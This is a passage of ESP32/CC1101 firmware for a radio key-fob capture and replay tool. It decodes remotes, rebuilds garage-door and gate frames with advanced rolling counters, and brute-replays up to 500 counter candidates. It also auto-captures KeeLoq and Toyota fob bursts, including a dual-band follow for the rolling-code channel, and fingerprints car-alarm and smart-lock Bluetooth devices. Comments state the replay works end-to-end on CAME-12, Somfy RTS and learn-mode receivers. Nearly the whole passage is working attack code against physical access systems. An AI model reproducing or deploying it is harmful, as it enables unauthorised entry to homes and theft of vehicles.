  }
  // Data
  for(int b = nBits - 1; b >= 0 && len + 2 <= maxLen; b--){
    bool one = (data >> b) & 1ULL;
    if(one){ buf[len++] = te;  buf[len++] = te2; }
    else   { buf[len++] = te2; buf[len++] = te;  }
  }
  // Trailing gap
  if(len + 2 <= maxLen){
    buf[len++] = te;
    uint32_t g = gapAfter ? gapAfter : (uint32_t)(20UL * te);
    buf[len++] = (uint16_t)(g > 60000UL ? 60000UL : g);
  }
  return len;
}

// ── Per-protocol thin builders ───────────────────────────────────────────────
// These rebuild the PHYSICAL frame at correct PWM timing for a new counter
// value. They do NOT apply protocol-level encryption — for KeeLoq, FAAC SLH,
// Hörmann, Sommer, Nice FLOR-S, Marantec the rolling counter is encrypted
// before transmission, so an incremented-plaintext frame will be rejected
// unless the user has loaded the manufacturer key (see ks_klPredict path)
// or the receiver is a fixed-code clone in "learn" mode.
//
// They DO work end-to-end for: CAME-12 (built in earlier), Somfy RTS (built
// in earlier — has public scrambler), and any of these protocols' fixed-code
// or learn-mode variants.

static int buildHormann(uint8_t btn, uint32_t sn, uint16_t te, uint16_t* buf, int maxLen){
  if(te < 100) te = 600;
  uint64_t d = ((uint64_t)(btn & 0xF) << 28) | (uint64_t)(sn & 0x0FFFFFFFUL);
  return buildOokPwm(d, 32, 16, te, 25UL * te, buf, maxLen);
}
static int buildSommer(uint32_t sn, uint16_t roll, uint16_t te, uint16_t* buf, int maxLen){
  if(te < 100) te = 440;
  uint64_t d = ((uint64_t)(sn & 0x0FFFFFFFUL) << 12) | (uint64_t)(roll & 0xFFF);
  return buildOokPwm(d, 40, 20, te, 30UL * te, buf, maxLen);
}
static int buildBeninca(uint16_t addr, uint8_t btn, uint16_t cnt, uint16_t te, uint16_t* buf, int maxLen){
  if(te < 100) te = 320;
  uint64_t d = ((uint64_t)(addr & 0xFFF) << 14) |
               ((uint64_t)(btn & 0x3)   << 12) |
                (uint64_t)(cnt & 0xFFF);
  return buildOokPwm(d, 26, 12, te, 25UL * te, buf, maxLen);
}
static int buildCardin(uint16_t addr, uint16_t roll, uint16_t te, uint16_t* buf, int maxLen){
  if(te < 100) te = 400;
  uint64_t d = ((uint64_t)(addr & 0xFFF) << 12) | (uint64_t)(roll & 0xFFF);
  return buildOokPwm(d, 24, 16, te, 30UL * te, buf, maxLen);
}
static int buildV2Phox(uint32_t sn, uint32_t roll, uint16_t te, uint16_t* buf, int maxLen){
  if(te < 100) te = 320;
  uint64_t d = ((uint64_t)sn << 32) | (uint64_t)roll;
  return buildOokPwm(d, 64, 12, te, 25UL * te, buf, maxLen);
}
static int buildNiceFlor(uint32_t sn, uint32_t roll, uint16_t te, uint16_t* buf, int maxLen){
  if(te < 100) te = 500;
  uint64_t d = ((uint64_t)(sn & 0x0FFFFFFFUL) << 24) | (uint64_t)(roll & 0xFFFFFFUL);
  return buildOokPwm(d, 52, 12, te, 30UL * te, buf, maxLen);
}
static int buildMarantec(uint16_t addr, uint8_t cmd, uint16_t te, uint16_t* buf, int maxLen){
  if(te < 100) te = 280;
  uint64_t d = ((uint64_t)(addr & 0xFFF) << 4) | (uint64_t)(cmd & 0xF);
  return buildOokPwm(d, 16, 8, te, 25UL * te, buf, maxLen);
}

// ─── Replay Sequence (50-candidate brute-advance) ────────────────────────────
// Waits up to waitMs ms, pumping the HTTP server and checking serial for
// replay_stop (return 1) or replay_next (return 2). Returns 0 on timeout.
int replaySeqWait(unsigned long waitMs){
  unsigned long t0=millis();
  static String slb="";
  while(millis()-t0<waitMs){
    srv.handleClient();
    while(Serial.available()){
      char c=Serial.read();
      if(c=='\n'||c=='\r'){
        slb.trim();
        if(slb.length()>3){
          JsonDocument jj;
          if(deserializeJson(jj,slb)==DeserializationError::Ok){
            if(!serialTokenMatches(jj)){
              serialEmit("{\"ok\":false,\"error\":\"unauthorized\"}");
            } else {
              String rop=jj["cmd"]|"";
              if(rop=="replay_stop"){slb="";return 1;}
              if(rop=="replay_next"){slb="";return 2;}
            }
          }
        }
        slb="";
      } else if(slb.length()<64) slb+=c;
    }
    delay(10);
  }
  return 0;
}

// Helper: build a frame for the given protocol with new counter into bufOut.
// Returns timing-entry count, or 0 if protocol has no builder (will replay raw).
// `sn` carries serial / address depending on protocol layout.
static int buildForProto(const String& proto, uint32_t sn, uint32_t newCtr,
                         uint16_t teUs, uint8_t ctrl,
                         uint16_t* bufOut, int maxLen){
  if(proto=="CAME-12" || proto=="CAME-12-Manchester"){
    int nl = 0;
    if(buildCame12((uint16_t)(newCtr & 0xFFF), teUs, bufOut, nl)) return nl;
    return 0;
  }
  if(proto=="Somfy-RTS")    return buildSomfyRTS(ctrl, (uint16_t)(newCtr & 0xFFFF), sn, bufOut, maxLen);
  if(proto=="Hormann-HSM")  return buildHormann((uint8_t)(ctrl & 0xF), sn, teUs, bufOut, maxLen);
  if(proto=="Sommer")       return buildSommer(sn, (uint16_t)(newCtr & 0xFFF), teUs, bufOut, maxLen);
  if(proto=="Beninca-TOGO") return buildBeninca((uint16_t)(sn & 0xFFF), (uint8_t)(ctrl & 0x3), (uint16_t)(newCtr & 0xFFF), teUs, bufOut, maxLen);
  if(proto=="Cardin-S449")  return buildCardin((uint16_t)(sn & 0xFFF), (uint16_t)(newCtr & 0xFFF), teUs, bufOut, maxLen);
  if(proto=="V2-Phox")      return buildV2Phox(sn, newCtr, teUs, bufOut, maxLen);
  if(proto=="Nice-FLOR")    return buildNiceFlor(sn, newCtr & 0xFFFFFFUL, teUs, bufOut, maxLen);
  if(proto=="Marantec-D")   return buildMarantec((uint16_t)(sn & 0xFFF), (uint8_t)(ctrl & 0xF), teUs, bufOut, maxLen);
  return 0;
}

// Replay up to 50 candidates advancing the counter by delta each step.
// For protocols with a frame-builder, the bit pattern is rebuilt with the new
// counter; all others fall back to repeating the raw captured rfBuf.
// On stop, the winning timing is copied to rfBuf so the user can save it.
void replaySeq(const String& proto,uint32_t sn,int32_t startCtr,int32_t delta,float mhz,int te,uint8_t ctrl,int nCand=50){
  if(nCand<1) nCand=1; else if(nCand>500) nCand=500;   // bound the transmit loop
  int teUs=(te>50&&te<5000)?te:360;
  bool isFixed=proto=="PT2262-fixed"||proto=="EV1527"||proto=="PT2240"||proto=="HT12E"||proto=="Linear-10"||proto.startsWith("OOK");
  bool isSomfy=proto=="Somfy-RTS";
  if(delta==0) delta=1;
  static uint16_t fb[300];
  for(int n=1;n<=nCand;n++){
    int32_t nextCtr=isFixed?startCtr:(startCtr+delta*(int32_t)n);
    serialEmit("{\"event\":\"replay_playing\",\"n\":"+String(n)+",\"of\":"+String(nCand)+",\"ctr\":"+String(nextCtr)+"}");
    setLed(255,140,0);
    bool txOk=false;
    int nl=buildForProto(proto, sn, (uint32_t)nextCtr, (uint16_t)teUs, ctrl, fb, 300);
    if(nl > 0){
      // Somfy stays on its native 433.42 MHz; others use whatever was captured.
      float txMhz = isSomfy ? 433.42f : mhz;
      uint8_t pw  = isSomfy ? 2 : 0;
      txOk = pw ? replayRaw(txMhz, fb, nl, pw) : replayRaw(txMhz, fb, nl);
    } else {
      // Unknown / fixed-code: just replay what we captured.
      txOk = replayRaw(mhz, rfBuf, rfLen, 3, rfStartHigh);
    }
    setLed(txOk?0:255,txOk?100:0,txOk?40:0);
    int r=replaySeqWait(2500);
    if(r==1){ // stop requested — copy winning frame into rfBuf for immediate save
      int wl=buildForProto(proto, sn, (uint32_t)nextCtr, (uint16_t)teUs, ctrl, fb, 300);
      if(wl > 0 && wl < CAP_SZ){
        memcpy(rfBuf, fb, wl * sizeof(uint16_t));
        rfLen  = wl;
        rfFreq = isSomfy ? 433.42f : mhz;
      }
      // else raw protocols: rfBuf already has the captured signal
      serialEmit("{\"event\":\"replay_stopped\",\"n\":"+String(n)+",\"of\":"+String(nCand)+",\"ctr\":"+String(nextCtr)+",\"proto\":\""+proto+"\",\"sn\":"+String(sn)+"}");
      setLed(0,150,65);
      return;
    }
    // r==2 (skip) or 0 (timeout): advance to next candidate
  }
  serialEmit("{\"event\":\"replay_done\",\"played\":"+String(nCand)+"}");
  setLed(0,150,65);
}

// Replay predicted next frame
// Replay a library group's predicted next frame using explicit decoded values.
// Called by /api/lib_replay — does NOT touch lastDecode.
String replayLibEntry(const String& proto,uint32_t sn,int32_t ctr,int32_t delta,float mhz,int te,uint8_t ctrl){
  setLed(255,140,0);
  bool isFixed=proto=="PT2262-fixed"||proto=="EV1527"||proto=="PT2240"||proto=="HT12E"||proto=="Linear-10"||proto.startsWith("OOK");
  if(isFixed){
    bool ok=replayRaw(mhz, rfBuf, rfLen, 3, rfStartHigh);
    setLed(0,150,65);
    return String("{\"cmd\":\"lib_replay\",\"ok\":")+( ok?"true":"false")+",\"method\":\"repeat\",\"note\":\"Fixed code replayed verbatim\"}";
  }
  if(proto=="CAME-12"||proto=="CAME-12-Manchester"){
    uint16_t next=(uint16_t)((uint32_t)(ctr+delta)&0xFFF);
    uint16_t nb[256]; int nl=0;
    if(buildCame12(next,(uint16_t)(te>0?te:320),nb,nl)&&replayRaw(mhz,nb,nl)){
      setLed(0,150,65); char ch[8]; snprintf(ch,8,"0x%03X",next);
      return String("{\"cmd\":\"lib_replay\",\"ok\":true,\"method\":\"came12\",\"code\":")+next+",\"code_hex\":\""+ch+"\"}";
    }
  }
  // General: build via buildForProto (KeeLoq, Hormann, Nice-FLOR, Sommer, etc.)
  uint32_t nextCtr=(uint32_t)((uint32_t)ctr+(uint32_t)delta);
  static uint16_t fb[300];
  int nl=buildForProto(proto,sn,nextCtr,(uint16_t)(te>0?te:360),ctrl,fb,300);
  if(nl>0){
    float txMhz=(proto=="Somfy-RTS")?433.42f:mhz;
    if(replayRaw(txMhz,fb,nl)){
      setLed(0,150,65);
      return String("{\"cmd\":\"lib_replay\",\"ok\":true,\"method\":\"frame-rebuilt\",\"proto\":\"")+proto+"\",\"next\":"+String(nextCtr)+",\"delta\":"+String(delta)+"}";
    }
  }
  // Fallback: replay raw capture at this freq
  bool ok=replayRaw(mhz, rfBuf, rfLen, 3, rfStartHigh);
  setLed(0,150,65);
  return String("{\"cmd\":\"lib_replay\",\"ok\":")+( ok?"true":"false")+",\"method\":\"replay-raw\",\"note\":\"No frame builder for this protocol — raw capture replayed\"}";
}

String replayPredicted(){
  if(lastDecode.length()<2) return "{\"cmd\":\"replay_predicted\",\"ok\":false,\"error\":\"no-decode\"}";
  JsonDocument jd;
  if(deserializeJson(jd,lastDecode)!=DeserializationError::Ok) return "{\"cmd\":\"replay_predicted\",\"ok\":false,\"error\":\"parse-fail\"}";
  String proto=jd["proto"]|"";
  float mhz=atof(jd["freq"]|"433.92");
  int te=clampTe(jd["te_us"]|0);
  setLed(255,140,0);
  bool isFixed=proto=="PT2262-fixed"||proto=="EV1527"||proto=="PT2240"||proto=="HT12E"||proto=="Linear-10"||proto.startsWith("OOK");
  if(isFixed){bool ok=replayRaw(mhz, rfBuf, rfLen, 3, rfStartHigh);setLed(0,150,65);return String("{\"cmd\":\"replay_predicted\",\"ok\":")+( ok?"true":"false")+",\"method\":\"repeat\",\"note\":\"Fixed code replayed verbatim\"}";}
  if(proto=="CAME-12"||proto=="CAME-12-Manchester"){
    uint16_t code=(uint16_t)(uint32_t)jd["code"];
    int32_t delta=jd["predict"]["delta"]|1;
    uint16_t next=(uint16_t)((code+delta)&0xFFF);
    uint16_t nb[256]; int nl=0;
    if(buildCame12(next,(uint16_t)te,nb,nl)&&replayRaw(mhz,nb,nl)){
      setLed(0,150,65); char ch[8]; snprintf(ch,8,"0x%03X",next);
      return String("{\"cmd\":\"replay_predicted\",\"ok\":true,\"method\":\"came12-predicted\",\"code\":")+next+",\"code_hex\":\""+ch+"\",\"note\":\"CAME-12 predicted counter transmitted\"}";
    }
  }
  // Somfy RTS: reconstruct full 7-byte frame with updated roll counter + checksum
  if(proto=="Somfy-RTS"){
    uint8_t ctrl=(uint8_t)(uint32_t)jd["ctrl"];
    uint32_t roll=(uint32_t)jd["roll"];
    uint32_t addr=(uint32_t)jd["addr"];
    int32_t delta=(int32_t)jd["predict"]["delta"]|1;
    uint16_t nextRoll=(uint16_t)((roll+(uint32_t)delta)&0xFFFF);
    static uint16_t sb[300]; int sl=buildSomfyRTS(ctrl,nextRoll,addr,sb,300);
    if(sl>0&&replayRaw(433.42f,sb,sl,2)){
      setLed(0,150,65);
      return String("{\"cmd\":\"replay_predicted\",\"ok\":true,\"method\":\"somfy-predicted\",\"roll\":")+nextRoll+",\"delta\":"+delta+",\"note\":\"Somfy RTS roll+"+String(delta)+" transmitted\"}";
    }
  }
  // Structural rebuild for Hörmann / Sommer / Beninca / Cardin / V2-Phox / Nice-FLOR / Marantec.
  // Carries an incremented counter at the protocol bit positions — works on fixed-code
  // variants and learn-mode receivers; encrypted rolling receivers will reject it
  // unless the manufacturer key is loaded (KeeLoq path) or cipher is public (Somfy).
  {
    uint32_t snv  = (uint32_t)jd["sn"];
    if(snv == 0) snv = (uint32_t)jd["addr"];
    uint32_t roll = (uint32_t)jd["roll"];
    if(roll == 0) roll = (uint32_t)jd["ctr"];
    int32_t  delta = (int32_t)jd["predict"]["delta"] | 1;
    uint8_t  ctrl  = (uint8_t)(uint32_t)jd["btn"];
    if(ctrl == 0) ctrl = (uint8_t)(uint32_t)jd["cmd"];
    uint32_t nextCtr = (uint32_t)(roll + (uint32_t)delta);
    static uint16_t fb[300];
    int nl = buildForProto(proto, snv, nextCtr, (uint16_t)(te>0?te:360), ctrl, fb, 300);
    if(nl > 0){
      float txMhz = (proto == "Somfy-RTS") ? 433.42f : mhz;
      if(replayRaw(txMhz, fb, nl)){
        setLed(0,150,65);
        return String("{\"cmd\":\"replay_predicted\",\"ok\":true,\"method\":\"frame-rebuilt\",\"proto\":\"")+proto+"\",\"next\":"+nextCtr+",\"delta\":"+delta+",\"note\":\"Frame rebuilt with counter+"+String(delta)+" — encrypted receivers will reject without manufacturer key\"}";
      }
    }
  }
  bool ok=replayRaw(mhz, rfBuf, rfLen, 3, rfStartHigh);
  setLed(0,150,65);
  return String("{\"cmd\":\"replay_predicted\",\"ok\":")+( ok?"true":"false")+",\"method\":\"replay-raw\",\"note\":\"Rolling cipher — raw capture replayed\"}";
}

// Auto-name from last decode
String autoName(){
  if(lastDecode.length()<2) return "RF_"+String(millis()%9999);
  JsonDocument jd;
  if(deserializeJson(jd,lastDecode)!=DeserializationError::Ok) return "RF_"+String(millis()%9999);
  String proto=jd["proto"]|"RF";
  proto.replace("-",""); proto.replace("fixed",""); proto.replace("Manchester","M");
  if((int)proto.length()>9) proto=proto.substring(0,9);
  String tail="";
  if(!jd["sn"].isNull()) tail=String((uint32_t)jd["sn"],HEX);
  else if(!jd["code"].isNull()) tail=String((uint32_t)jd["code"],HEX);
  else if(!jd["addr"].isNull()) tail=String((uint32_t)jd["addr"],HEX);
  else tail=String(millis()%9999);
  tail.toUpperCase(); if((int)tail.length()>8) tail=tail.substring(0,8);
  return proto+"_"+tail;
}

// ─── Key Storage ──────────────────────────────────────────────────────────────
// `startHigh` is the level of data[0]; it must be preserved so a later replay
// transmits correct levels (see rfStartHigh). Callers that pass a capture buffer
// supply rfStartHigh; callers that pass a generated frame supply the default.
int keySave(String name,float freq,uint16_t* data,int len,bool startHigh=true){
  for(int i=0;i<MAX_KEYS;i++) if(!keys[i].used){
    keys[i].used=true; keys[i].name=name; keys[i].freq=freq;
    keys[i].len=min(len,KEY_SZ); memcpy(keys[i].data,data,keys[i].len*2);
    keys[i].sh=startHigh;
    return i;
  }
  return -1;
}
String keysJson(){
  String j="["; int n=0;
  for(int i=0;i<MAX_KEYS;i++) if(keys[i].used){
    if(n++) j+=",";
    j+="{\"i\":"+String(i)+",\"name\":\""+keys[i].name+"\",\"freq\":"+String(keys[i].freq,2)+",\"len\":"+String(keys[i].len)+"}";
  }
  return j+"]";
}

// ─── Background Scanner ───────────────────────────────────────────────────────
struct FreqStat { float freq; int rssi; int hits; uint32_t lastHit; };
FreqStat freqStats[N_FREQS];
bool freqStatsInit=false;

void initFreqStats(){
  for(int i=0;i<N_FREQS;i++){freqStats[i]={FOB_FREQS[i],-130,0,0};}
  freqStatsInit=true;
}

// Returns the scan dwell time (ms) for a given frequency.
// Near stickyFreq the sweep ramps up on a quadratic ease-in so the scan
// slows down as it approaches the sticky frequency, lingers at the peak,
// then gradually speeds back up as it moves away.
//   prio-2 (KeeLoq / Toyota-Denso): 10× normal dwell, capped at 800 ms
//   prio-1 (other decoded fob):      5× normal dwell, capped at 400 ms
static uint16_t scanDwellMs(float freq){
  if(fastHopActive) return fastHopDwellMs; // fast-hop: uniform short dwell on every channel
  if(stickyFreq==0.0f) return SCAN_DWELL_MS;
  float dist=fabsf(freq-stickyFreq);
  const float R=6.0f; // MHz: ramp region on each side of sticky freq
  if(dist>=R) return SCAN_DWELL_MS;
  float t=1.0f-(dist/R);             // 0 at edge → 1 at centre
  float peak=(stickyPrio>=2)?10.0f:5.0f;
  float factor=1.0f+(peak-1.0f)*t*t; // quadratic ease-in
  uint16_t d=(uint16_t)(SCAN_DWELL_MS*factor);
  uint16_t cap=(stickyPrio>=2)?800u:400u;
  return d<cap?d:cap;
}

void scanTick(){
  if(!scanActive||!cc1101OK) return;
  unsigned long now=millis();
  if(now-scanLast<scanDwellMs(FOB_FREQS[scanIdx])) return;
  scanLast=now;
  SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
  cc_setFreq(FOB_FREQS[scanIdx]); cc_strobe(0x34); delay(5);
  long rs=0; for(int j=0;j<6;j++){rs+=cc_fastRSSI();delayMicroseconds(400);}
  int r=(int)(rs/6);
  SPI.endTransaction();
  freqStats[scanIdx].rssi=r;
  if(r>-80){freqStats[scanIdx].hits++;freqStats[scanIdx].lastHit=now;
    if(scanLogN<128){scanLog[scanLogN++]={FOB_FREQS[scanIdx],r,(uint32_t)now};}
    else{memmove(scanLog,scanLog+1,127*sizeof(ScanTick));scanLog[127]={FOB_FREQS[scanIdx],r,(uint32_t)now};}
    // Emit weak-hit JSON to USB serial for dashboard live-feed (throttled: once per 500ms per freq)
    static unsigned long lastWeakMs[N_FREQS]={};
    if(r<=-70&&now-lastWeakMs[scanIdx]>500){
      lastWeakMs[scanIdx]=now;
      serialEmit("{\"event\":\"weak\",\"f\":"+String(FOB_FREQS[scanIdx],2)+",\"rssi\":"+String(r)+",\"pulses\":0}");
    }
    // Auto-capture: fires when signal exceeds autoCapDbm (default -60 dBm).
    // Raise autoCapDbm via the squelch slider if nearby 433 MHz devices
    // (weather sensors, tire sensors, doorbells) cause false captures.
    //
    // Cooldown timer replaces the old rfLen==0 guard.
    // The old guard caused a permanent deadlock: after the first capture
    // rfLen>0 blocked every subsequent auto-capture, so continuous scan
    // only ever captured one signal per session. The 500 ms cooldown lets
    // the burst silence clear before re-arming, then any fob press — from
    // the same fob or a completely different one — triggers a new capture.
    static unsigned long lastAutoCapMs = 0;
    if(r>autoCapDbm && (millis()-lastAutoCapMs)>500){
      // Multi-sample confirmation: take 2 more readings with a 3 ms gap each.
      // A real fob press lasts 100-500 ms — it will still be there.
      // A switching-supply spike or sub-ms RF burst will NOT survive both checks.
      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
      delay(1); int rc1=cc_fastRSSI();
      delay(1); int rc2=cc_fastRSSI();
      SPI.endTransaction();
      if(rc1<=autoCapDbm && rc2<=autoCapDbm){
        // Both confirmations failed — transient spike, skip.
      } else {
        scanActive=false;
        addLog("[SCAN] Signal on "+String(FOB_FREQS[scanIdx],2)+" MHz ("+String(r)+" dBm, conf "+String(max(rc1,rc2))+" dBm) — auto-capturing");
        {
          bool acOk=captureSignal(CAP_TIMEOUT_MS);
          if(acOk){
            decodeSignal();
            // Toyota-band multi-attempt retry.
            // Toyota fobs repeat the same frame 3-5 times per button press with
            // ~250 ms inter-frame silence.  If the first capture landed mid-preamble
            // and returned "too_short" (cnt<80, decoder never ran), the fob is still
            // transmitting.  Immediately retry on the same frequency — up to 2 more
            // attempts — to catch the next clean repetition.  The final lastDecode
            // (from whichever attempt succeeded or produced the most edges) is what
            // continues to sigQPush / serialEmit below.
            {
              float _sf=FOB_FREQS[scanIdx]; bool _tb=(_sf>=309.0f&&_sf<=316.0f);
              if(_tb&&lastDecode.indexOf("\"too_short\"")>=0){
                for(int _tr=0;_tr<2&&lastDecode.indexOf("\"too_short\"")>=0;_tr++){
                  addLog("[CAP] Toyota too_short — retry "+String(_tr+1)+"/2 on "+String(_sf,2)+" MHz");
                  curFreq=_sf; // keep rfFreq tracking the actual capture frequency
                  if(captureSignal(CAP_TIMEOUT_MS)) decodeSignal();
                }
              }
            }
            // OOK-raw = real capture, no decoder matched — still useful for FOBclone replay.
            // Only suppress actual capture errors (garbled edges, timeout, etc.).
            bool isNoise=(lastDecode.indexOf("\"error\"")>=0);
              if(!isNoise){
              markDecodeKept(lastDecode);
              sigQPush(lastDecode);   // WiFi AP: queued so rapid captures are not lost
              serialEmit(lastDecode); // USB serial: emitted immediately
              // Headless mode: also persist to NVS library + audible confirmation
              if(headlessActive){ hsLib_save(lastDecode); beep(2200, 60); }
              // FOBclone headless: advance state machine on rolling-code captures
              if(hfcActive){ hfc_onDecode(lastDecode); }
              // FOBback: push raw capture into replay buffer when armed
              if(fbkArmed && rfLen>0 && rfLen<=CAP_SZ && fbkCount<FBK_MAX){
                fbkAppend(rfBuf,rfLen,rfFreq,rfStartHigh,lastDecode);
              }


// Sticky linger: bias subsequent sweeps to dwell near this frequency.
// KeeLoq / Toyota-Denso get prio-2 (10× dwell, 800ms peak);
// all other decoded fobs get prio-1 (5× dwell, 400ms peak).
              bool isKL=(lastDecode.indexOf("\"KeeLoq\"")>=0);
              bool isToy=(lastDecode.indexOf("\"Toyota-Denso\"")>=0);
              stickyFreq=rfFreq;
              stickyPrio=(isKL||isToy)?2:1;

              // ── Dual-band follow: Toyota/NA Ch A (312-310 MHz) → Ch B (314-315 MHz) ─
              // Many Toyota, Lexus, and Subaru fobs broadcast two bursts simultaneously
              // on every button press: a fixed-code Ch A (~312 MHz) and a rolling-code
              // Ch B (~314 MHz). After capturing Ch A, we immediately hop to Ch B band
              // and attempt a 250 ms capture of whatever burst is still in progress.
              // CC1101 PLL relock is ~150 µs; with the button held 300-600 ms, repetitions
              // 2-4 of the Ch B burst are typically still available.
              {
                static const float CHA_THR[] = {312.20f,312.90f,313.00f,309.75f,310.00f,310.25f};
                static const float CHB_TRY[] = {314.35f,314.65f,314.89f,315.00f};
                bool isChanA=false;
                for(int ci=0;ci<6;ci++) if(fabsf(rfFreq-CHA_THR[ci])<0.15f){isChanA=true;break;}
                if(isChanA){
                  // Preserve Ch A capture — captureSignal() overwrites rfBuf/rfLen/rfFreq
                  static uint16_t chABak[CAP_SZ]; int chALen=rfLen; float chAMhz=rfFreq;
                  memcpy(chABak,rfBuf,rfLen*sizeof(uint16_t));
                  String chADecode=lastDecode;
                  rfLenB=0; rfFreqB=0.0f;
                  for(int bi=0;bi<4&&rfLenB==0;bi++){
                    cc_setFreq(CHB_TRY[bi]);
                    delay(2);               // PLL settle — 150 µs min, 2 ms is conservative
                    rfLen=0;
                    // 250 ms is the EDGE budget, not the wait timeout: capMaxMsOverride
                    // bounds the recording, and 3000 is the wait for the signal to appear.
                    // Passing 250 as timeoutMs alone would have left a 3 s recording.
                    capMaxMsOverride=250;
                    bool chbOk=captureSignal(3000); // record 250 ms once triggered
                    if(chbOk&&rfLen>18){
                      rfLenB=rfLen; rfFreqB=CHB_TRY[bi];
                      memcpy(rfBufB,rfBuf,rfLen*sizeof(uint16_t));
                      rfStartHighB=rfStartHigh;   // Ch B has its own polarity
                      decodeSignal();
                      // Tag Ch B JSON with channel metadata before emitting
                      String chbDecode=lastDecode;
                      int ins=chbDecode.indexOf('{');
                      if(ins>=0) chbDecode=chbDecode.substring(0,ins+1)+
                        "\"chan\":\"B\",\"ch_b_paired\":true,"+chbDecode.substring(ins+1);
                      bool chbNoise=(chbDecode.indexOf("\"error\"")>=0);
                      if(!chbNoise){ sigQPush(chbDecode); serialEmit(chbDecode); }
                      addLog("[DUAL-B] Ch B "+String(rfFreqB,2)+" MHz, "+String(rfLenB)+" edges");
                    }
                  }
                  // Restore Ch A as the active buffer — all existing replay/save paths
                  // still work against rfBuf/rfFreq/lastDecode as usual.
                  rfLen=chALen; rfFreq=chAMhz;
                  memcpy(rfBuf,chABak,chALen*sizeof(uint16_t));
                  lastDecode=chADecode;
                  // Notify both dashboards that a paired Ch B buffer is now ready
                  if(rfLenB>0){
                    String ev="{\"event\":\"dual_band_ready\",\"ch_a_mhz\":"+String(rfFreq,2)+
                      ",\"ch_b_mhz\":"+String(rfFreqB,2)+",\"ch_b_len\":"+String(rfLenB)+"}";
                    sigQPush(ev); serialEmit(ev);
                  }
                }
              }
              // ── end dual-band follow ──────────────────────────────────────────────
            }
          }
          // Stamp cooldown so the next scan tick doesn't re-arm until 500 ms
          // of silence have passed. Prevents double-triggering on the same burst.
          lastAutoCapMs=millis();
          // Respect an explicit user Stop: if the user pressed Stop while this
          // capture was running, scanUserPaused is true — don't override it.
          if(!scanUserPaused) scanActive=true;
        }
      }
    }
  }
  // Emit sweep tick at end of each full sweep so USB dashboard can show live sweep indicator
  static uint32_t sweepCount=0;
  int nextIdx=(scanIdx+1)%N_FREQS;
  // Range sweep: skip frequencies outside [sweepMin, sweepMax]
  if(sweepMin>0.0f||sweepMax<9999.0f){
    int guard=0;
    while(guard<N_FREQS&&(FOB_FREQS[nextIdx]<sweepMin||FOB_FREQS[nextIdx]>sweepMax)){
      nextIdx=(nextIdx+1)%N_FREQS; guard++;
    }
  }
  bool wrapped=(nextIdx<=scanIdx);
  if(wrapped) sweepCount++;
  scanIdx=nextIdx;
  if(wrapped){
    serialEmit("{\"event\":\"tick\",\"fi\":"+String(scanIdx)+",\"mhz\":"+String(FOB_FREQS[scanIdx],2)+",\"sweeps\":"+String(sweepCount)+
      (stickyFreq>0.0f?",\"sticky_mhz\":"+String(stickyFreq,2)+",\"sticky_prio\":"+String(stickyPrio):String(""))+"}");
  }
}

String scanStatsJson(){
  String j="{\"freqs\":[";
  for(int i=0;i<N_FREQS;i++){
    if(i) j+=",";
    j+="{\"f\":"+String(freqStats[i].freq,2)+",\"r\":"+String(freqStats[i].rssi)+",\"h\":"+String(freqStats[i].hits)+"}";
  }
  j+="],\"log\":[";
  int start=max(0,scanLogN-20);
  for(int i=start;i<scanLogN;i++){
    if(i>start) j+=",";
    j+="{\"f\":"+String(scanLog[i].freq,2)+",\"r\":"+String(scanLog[i].rssi)+",\"ts\":"+String(scanLog[i].ts)+"}";
  }
  return j+"]}";
}


// ─── Web Dashboard ───────────────────────────────────────────────────────────
// Dashboard the card serves. One copy, in html_page.h.
#include "html_page.h"


// ─── Web Server Routes ────────────────────────────────────────────────────────
// ─── BLE Scanner helpers ──────────────────────────────────────────────────────
static const char* ble_fp(const char* uuids, const char* name){
  String u(uuids); u.toLowerCase();
  String n(name);  n.toLowerCase();
  if(u.indexOf("0000fd50")>=0||n.indexOf("tuya")>=0)           return "Tuya Smart";
  if(u.indexOf("00001000")>=0||n.indexOf("ttlock")>=0)         return "TTLock";
  if(u.indexOf("0000ffe0")>=0||n.indexOf("pandora")>=0)        return "Pandora Mini BT";
  if(u.indexOf("0000fff0")>=0||n.indexOf("dronemobile")>=0)    return "Compustar/DroneMobile";
  if(u.indexOf("0000fe24")>=0||n.indexOf("yale")>=0)           return "Yale Access";
  if(n.indexOf("compustar")>=0||n.indexOf("invisikey")>=0)     return "Compustar InvisiKEY";
  if(n.indexOf("viper")>=0||n.indexOf("smartstart")>=0)        return "Viper SmartStart";
  if(n.indexOf("karr")>=0)                                     return "KARR Security";
  if(u.indexOf("0000fe9a")>=0)                                 return "iDatalink/Compustar";
  return "";
}

class BleAdCb : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) override {
    if(bleDevCount>=20) return;
    BleEntry& e=bleDevs[bleDevCount];
    strncpy(e.addr,dev.getAddress().toString().c_str(),17); e.addr[17]='\0';
    strncpy(e.name,dev.getName().c_str(),32);               e.name[32]='\0';
    e.rssi=dev.getRSSI();
    e.uuids[0]='\0';
    if(dev.haveServiceUUID()){
      strncat(e.uuids,dev.getServiceUUID().toString().c_str(),sizeof(e.uuids)-1);
    }
    e.mfrHex[0]='\0';
    if(dev.haveManufacturerData()){
      String mfr=dev.getManufacturerData();
      int nb=min((int)mfr.length(),16);
      for(int i=0;i<nb;i++){
        char h[3]; sprintf(h,"%02x",(uint8_t)mfr[i]);
        strncat(e.mfrHex,h,sizeof(e.mfrHex)-strlen(e.mfrHex)-1);
      }
    }
    const char* sys=ble_fp(e.uuids,e.name);
    strncpy(e.system,sys,27); e.system[27]='\0';
    bleDevCount++;
  }
};
static BleAdCb* bleCbInst=nullptr;
static void bleOnScanDone(BLEScanResults){
  bleScanBusy=false; bleScanReady=true; bleLastScanMs=(uint32_t)millis();
  BLEDevice::getScan()->clearResults();
}

// ── BLE Security callback — called on pairing/bonding completion ──────────────
// Stores the bonded device address in blePairLastAddr and sets blePairDone.
// The ESP32 BLE stack automatically writes the IRK to its bond table in NVS.
class BleSecCb : public BLESecurityCallbacks {
  bool    onConfirmPIN(uint32_t) override { return true; }
  bool    onSecurityRequest()    override { return true; }
  uint32_t onPassKeyRequest()    override { return 0; }
  void    onPassKeyNotify(uint32_t) override {}
#if !defined(ESP_ARDUINO_VERSION_MAJOR) || ESP_ARDUINO_VERSION_MAJOR < 3
  // Core 2.x: onAuthenticationComplete(esp_ble_auth_cmpl_t) exists in BLESecurityCallbacks.
  // Core 3.x removed this method from the interface entirely, so we omit it there
  // to avoid "does not override" / "has not been declared" errors.
